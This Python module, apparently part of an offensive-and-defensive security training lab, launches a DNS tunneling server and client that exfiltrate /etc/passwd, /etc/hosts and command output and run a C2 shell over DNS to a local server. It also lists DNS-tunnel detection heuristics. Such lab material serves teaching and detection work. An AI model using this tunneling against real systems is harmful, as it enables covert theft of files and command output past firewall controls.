"""
Module 6 – DNS Tunneling (integrated with existing dns_tunnel_lab)
===================================================================
Launches and demonstrates the full DNS tunnel server/client stack.
"""

import os
import subprocess
import sys
import time
import threading

from modules.base import LabModule
from shared.ui import *
from shared.prereqs import check_root

# Locate the DNS tunnel lab relative to this file
_HERE    = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_LAB_DIR = os.path.join(os.path.dirname(_HERE), "dns_tunnel_lab")
# Also check parent directories
for _candidate in [
    os.path.join(_HERE, "..", "dns_tunnel_lab"),
    os.path.join(os.path.expanduser("~"), "dns_tunnel_lab"),
    "/home/ocelot/dns_tunnel_lab",
]:
    if os.path.isdir(_candidate):
        _LAB_DIR = os.path.abspath(_candidate)
        break


class DnsTunnelModule(LabModule):
    NAME          = "DNS Tunneling (C2 & Exfiltration)"
    DESCRIPTION   = "Encode data inside DNS queries to bypass firewall egress controls"
    MITRE         = "T1071.004 – Application Layer Protocol: DNS"
    DIFFICULTY    = "Intermediate"
    REQUIRES_ROOT = False

    GUIDE = """
## Overview
DNS tunneling encodes arbitrary data inside DNS query names and TXT
record responses. Because DNS is universally permitted through firewalls,
this creates a covert channel even in heavily restricted environments.

## How It Works
Data is hex-encoded and embedded in subdomain labels:
```
DATA.sessid.0.10.726f6f743a783a303a30.tunnel.lab.local
└──────── /etc/passwd data ────────────────────────────┘
```

The server (authoritative DNS for tunnel.lab.local) decodes and
reassembles the data. All traffic appears to be legitimate DNS
resolution to any perimeter device.

## Modes
- exfil  — exfiltrate a file silently
- cmd    — run a command and send output to C2
- stdin  — pipe arbitrary data through DNS
- shell  — interactive C2 demo shell

## Lab Architecture
```
[Client] → DNS query (data in subdomain) → [Server]
[Server] → DNS TXT response (ACK/command) → [Client]
Port 5353 UDP, domain: tunnel.lab.local
```

## Detection (6 heuristics)
1. Shannon entropy > 3.8 on subdomain labels
2. FQDN length > 120 characters
3. Hex/base32 patterns in labels
4. Query rate > 30/minute from one source
5. Unique subdomain ratio > 80%
6. TXT record query anomaly
"""

    def __init__(self):
        super().__init__()
        self.lab_dir = _LAB_DIR
        self.port    = 5353
        self.domain  = "tunnel.lab.local"
        self._srv_proc = None

    def setup(self) -> bool:
        section("DNS Tunnel Lab Integration")

        if not os.path.isdir(self.lab_dir):
            warn(f"dns_tunnel_lab not found at: {self.lab_dir}")
            alt = ask("Enter path to dns_tunnel_lab directory", "")
            if alt and os.path.isdir(alt):
                self.lab_dir = alt
            else:
                error("Cannot locate dns_tunnel_lab. "
                      "Ensure it is set up in ~/dns_tunnel_lab")
                return False

        self.port   = int(ask("Tunnel server port", str(self.port)))
        self.domain = ask("Tunnel domain", self.domain)
        success(f"Lab directory found: {self.lab_dir}")
        return True

    def run(self):
        section("DNS Tunnel Demo")
        info(f"Lab dir : {self.lab_dir}")
        info(f"Port    : {self.port}")
        info(f"Domain  : {self.domain}")
        print()

        # Start server
        if confirm("Start tunnel server in background?", default=True):
            self._start_server()
            time.sleep(1.5)

        # Menu of client demos
        while True:
            idx = choose("Client demo mode", [
                "Exfiltrate /etc/passwd",
                "Exfiltrate /etc/hosts",
                "Run command & exfiltrate output",
                "Interactive shell demo",
                "Show Blue Team analyzer output",
                "Return to main menu",
            ])

            if idx == 0:
                self._run_client("--mode exfil --file /etc/passwd")
            elif idx == 1:
                self._run_client("--mode exfil --file /etc/hosts")
            elif idx == 2:
                cmd = ask("Command to exfiltrate", "id && uname -a && hostname")
                self._run_client(f'--mode cmd --command "{cmd}"')
            elif idx == 3:
                self._run_client("--mode shell")
            elif idx == 4:
                self._show_analyzer()
            elif idx == 5:
                break

        section("Exfiltrated Data")
        exfil_dir = os.path.join(self.lab_dir, "exfiltrated_data")
        if os.path.isdir(exfil_dir):
            sessions = os.listdir(exfil_dir)
            if sessions:
                info(f"Sessions saved in {exfil_dir}:")
                for s in sessions:
                    summary = os.path.join(exfil_dir, s, "summary.json")
                    if os.path.exists(summary):
                        import json
                        with open(summary) as f:
                            d = json.load(f)
                        tag(s[:8], f"bytes={d.get('bytes','?')} "
                            f"hostname={d.get('metadata',{}).get('hostname','?')}")
            else:
                warn("No sessions yet — run a client demo first.")

    def _start_server(self):
        srv_script = os.path.join(self.lab_dir, "dns_tunnel_server.py")
        if not os.path.exists(srv_script):
            error(f"Server script not found: {srv_script}")
            return
        log_path = os.path.join(self.lab_dir, "logs", "tunnel_server.log")
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, "w") as log_f:
            self._srv_proc = subprocess.Popen(
                [sys.executable, srv_script,
                 "--domain", self.domain,
                 "--interface", "0.0.0.0",
                 "--port", str(self.port),
                 "--verbose"],
                stdout=log_f, stderr=log_f,
                cwd=self.lab_dir
            )
        success(f"Server started (PID {self._srv_proc.pid}), log → {log_path}")

    def _run_client(self, args_str: str):
        client_script = os.path.join(self.lab_dir, "dns_tunnel_client.py")
        if not os.path.exists(client_script):
            error(f"Client script not found: {client_script}")
            return
        cmd = (f"{sys.executable} {client_script} "
               f"--server 127.0.0.1 --port {self.port} "
               f"--domain {self.domain} --verbose {args_str}")
        info(f"Running: {cmd}")
        print()
        subprocess.run(cmd, shell=True, cwd=self.lab_dir)

    def _show_analyzer(self):
        analyzer = os.path.join(self.lab_dir, "dns_tunnel_analyzer.py")
        if not os.path.exists(analyzer):
            error("Analyzer not found in lab directory.")
            return
        warn("Starting analyzer in foreground. Ctrl+C to stop and see summary.")
        out = os.path.join(self.lab_dir, "logs", f"alerts_{int(time.time())}.json")
        subprocess.run(
            [sys.executable, analyzer, "--pcap", "captures/latest.pcap"]
            if os.path.exists(os.path.join(self.lab_dir, "captures", "latest.pcap"))
            else [sys.executable, analyzer, "--interface", "lo", "--output-json", out],
            cwd=self.lab_dir
        )

    def teardown(self):
        if self._srv_proc:
            try:
                self._srv_proc.terminate()
                info("Tunnel server stopped.")
            except Exception:
                pass
